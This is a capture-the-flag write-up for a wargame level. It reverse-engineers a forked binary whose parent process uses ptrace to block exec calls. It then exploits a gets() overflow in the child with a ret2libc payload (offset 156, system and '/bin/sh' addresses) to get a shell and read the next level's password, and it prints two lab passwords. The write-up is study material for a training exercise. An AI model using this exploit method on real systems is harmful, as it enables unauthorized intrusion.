login : pw
	level04 : kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

################################################
GDB
################################################

=> disas main
	0x080486c8 <+0>:	push   ebp
	0x080486c9 <+1>:	mov    ebp,esp
	0x080486cb <+3>:	push   edi
	0x080486cc <+4>:	push   ebx
	0x080486cd <+5>:	and    esp,0xfffffff0
	0x080486d0 <+8>:	sub    esp,0xb0
		=> p/d 0xb0
			176
		# At most 176 bytes allocated on the stack from main function

	0x080486d6 <+14>:	call   0x8048550 <fork@plt>
	0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
		# New local var [esp+0xac], lets call it 'pid'

	0x080486e2 <+26>:	lea    ebx,[esp+0x20]
	0x080486e6 <+30>:	mov    eax,0x0
	0x080486eb <+35>:	mov    edx,0x20
	0x080486f0 <+40>:	mov    edi,ebx
	0x080486f2 <+42>:	mov    ecx,edx
	0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
		=> p/d 0x20
			32
		# New local var [esp+0x20], let's call it 'buf'
		# Counter ecx = 32
		# Set 20 following at eax = 0 strating in [esp+0x20]
		# DWORD = sizeof(int) = 32 * 4 = 128
		# Equivalent to bzero(buf, 128)

	0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
	0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
		# New local var [esp+0xa8], lets call it 'a'
		# New local var [esp+0x1c], lets call it 'b'

	0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
	0x08048711 <+73>:	jne    0x8048769 <main+161>
		# [esp+0xac] = 'pid'

	0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
	0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
	0x08048722 <+90>:	call   0x8048540 <prctl@plt>
		# pctl(1, 1)
		# Local machine
		=> man prctl
			with values defined in <linux/prctl.h>
		=> find / -name prctl.h 2> /dev/null
			/usr/include/linux/prctl.h
		# First arg is PR_SET_PDEATHSIG, second arg is a signal
		# Second arg defines signal value the caller gets when its parent dies

	0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
	0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
	0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
	0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
	0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
		# ptrace(0, 0, 0, 0)
		# Local machine
		=> man ptrace
			PTRACE_TRACEME
		=> grep -R PTRACE_TRACEME /usr/include
			/usr/include/linux/ptrace.h:#define PTRACE_TRACEME
		# First argument is PTRACE_TRACEME

	0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
	0x08048752 <+138>:	call   0x8048500 <puts@plt>
		=> x/s 0x8048903
			0x8048903:	 "Give me some shellcode, k"

	0x08048757 <+143>:	lea    eax,[esp+0x20]
	0x0804875b <+147>:	mov    DWORD PTR [esp],eax
	0x0804875e <+150>:	call   0x80484b0 <gets@plt>
		# [esp+0x20] = 'buf'
		# gets function is vulnerable

	0x08048763 <+155>:	jmp    0x804881a <main+338>
		# Return of child

	0x08048768 <+160>:	nop	# Jumped here from main+296
	0x08048769 <+161>:	lea    eax,[esp+0x1c] # Jumped here from main+73
	0x0804876d <+165>:	mov    DWORD PTR [esp],eax
	0x08048770 <+168>:	call   0x80484f0 <wait@plt>
		# [esp+0x1c] = 'b' = 0

	0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
	0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
	0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
	0x08048787 <+191>:	and    eax,0x7f
	0x0804878a <+194>:	test   eax,eax
	0x0804878c <+196>:	je     0x80487ac <main+228>
		=> p/d 0x7f
			127
		# [esp+0x1c] = 'b'
		# New local var, [esp+0xa0], let's call it 'c'
		# Jump to main+228 if b = 127

	0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
	0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
	0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
	0x080487a0 <+216>:	and    eax,0x7f
	0x080487a3 <+219>:	add    eax,0x1
	0x080487a6 <+222>:	sar    al,1
	0x080487a8 <+224>:	test   al,al
	0x080487aa <+226>:	jle    0x80487ba <main+242>
		=> p/d 0x7f
			127
		# [esp+0x1c] = 'b'
		# New local var, [esp+0xa4], lets call it 'd'
		# sar is a right shift with sign preserved
		# Jump to main+242 if (b & 127)+1>>1 <= 0

	0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d # Jumped here from main+196
	0x080487b3 <+235>:	call   0x8048500 <puts@plt>
	0x080487b8 <+240>:	jmp    0x804881a <main+338>
		=> x/s 0x804891d
			0x804891d:	 "child is exiting..."
		# return 0

	0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0 # Jumped here from main+226
	0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
	0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
	0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
	0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
	0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
	0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
		=> p/d 0x2c
			44
		# [esp+0xac] = 'pid'
		# ptrace(3, pid, 44, 0)
		# Local machine
		# /usr/include/linux/ptrace.h: 3 corresponds to PTRACE_PEEKUSR
		=> man ptrace
			Read a word at offset addr in the tracee's USER area
			word is returned as the result of the ptrace() call
		# offset is 44
		# word is equivalent to short int
		# return value stored in [esp+0xa8] = 'a'

	0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
	0x080487f0 <+296>:	jne    0x8048768 <main+160>
		=> p/d 0xb
			11
		# [esp+0xa8] = 'a'
		# Loop if ptrace return value is not equal to 11

	0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
	0x080487fd <+309>:	call   0x8048500 <puts@plt>
		=> x/s 0x8048931
			0x8048931:	 "no exec() for you"

	0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
	0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
	0x08048811 <+329>:	mov    DWORD PTR [esp],eax
	0x08048814 <+332>:	call   0x8048520 <kill@plt>
		# [esp+0xac] = 'pid'

	0x08048819 <+337>:	nop
	0x0804881a <+338>:	mov    eax,0x0 # Jumped from main+155
	0x0804881f <+343>:	lea    esp,[ebp-0x8]
	0x08048822 <+346>:	pop    ebx
	0x08048823 <+347>:	pop    edi
	0x08048824 <+348>:	pop    ebp
	0x08048825 <+349>:	ret 

################################################
SUMMARY
################################################

We have 2 processes, standard fork()

Child process
	Allows the parent to trace it
	gets() called, vulnerable function

Parent process
	Loop
		wait for child process and stores wstatus into var b
		bitwise on wstatus
		if normal exit return status
			return
		else
			ptrace to get syscall value from child
			if syscall value != 11, repeat loop
	kill child with 9 sig

ptrace
	Child process will stop whenever a syscall is made
	Parent process will check the syscall number (44 = 4 * ORIG_EAX)
		https://www.linuxjournal.com/article/6100
		/usr/include/sys/reg.h
		if syscall value is 11 (exec), it will kill the child
		
My guess is I need to overflow the child gets function call
Overwrite instruction pointer to a function that doesnt make 11 syscall (cmd exec)

################################################
EXPLOIT - ATTEMPT 1
################################################

# https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
# When a program forks, gdb will continue to debug parent process
# Lets try

=> r
	=> aaa
		child is exiting...

# gets buffer size should be 128
# main stack contains 176 bytes
# Lets try to overflow it so lets take a margin as Im lazy to do the calculation by hand

=> python -c 'print "a"*200'
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

=> r
	=> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	# Infinite loop

# Indeed gdb remains in the parent debugging process even if child process is supposed to have crashed
# https://sourceware.org/gdb/onlinedocs/gdb/Forks.html

=> set follow-fork-mode child

=> r
	[New process 2500]
	=> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
		Program received signal SIGSEGV, Segmentation fault.
		0x61616161 in ?? ()
		# That worked, perfect !

# Lets use gdb peda to find the offset: pattern create 200
# AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

=> r
	=> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
		Program received signal SIGSEGV, Segmentation fault.
		0x71414154 in ?? ()
		# ascii: 54 = T | 41 = A | 71 = q

# pattern offset TAAq = 156

# I already know I cant use an exec syscall
# Custom shell code wont work as it execs so it will be killed by parent
# However a ret2libc, system should work
# Indeed, system creates a fork not to change the calling process
# This fork can make 11 syscall without being caught by grand parent process
# I could also create a custom code to open, read and write .pass file but lets be honest, Im lazy

=> info func system
	0xf7e6aed0  system
	# Target address

=> info proc map
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

=> find 0xf7e2c000, 0xffffffff, "/bin/sh"
	0xf7f897ec

# Let's not forget the pushed next instruction pointer when a function is called
=> python -c 'print "a"*156 + "\xd0\xae\xe6\xf7" + "pEIP" + "\xec\x97\xf8\xf7"' > /tmp/c

=> r < /tmp/c
	process 2554 is executing new program: /bin/dash

# Lets not forget to keep reading stdin
=> cat /tmp/c - | ./level04

=> cat /home/users/level05/.pass
	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
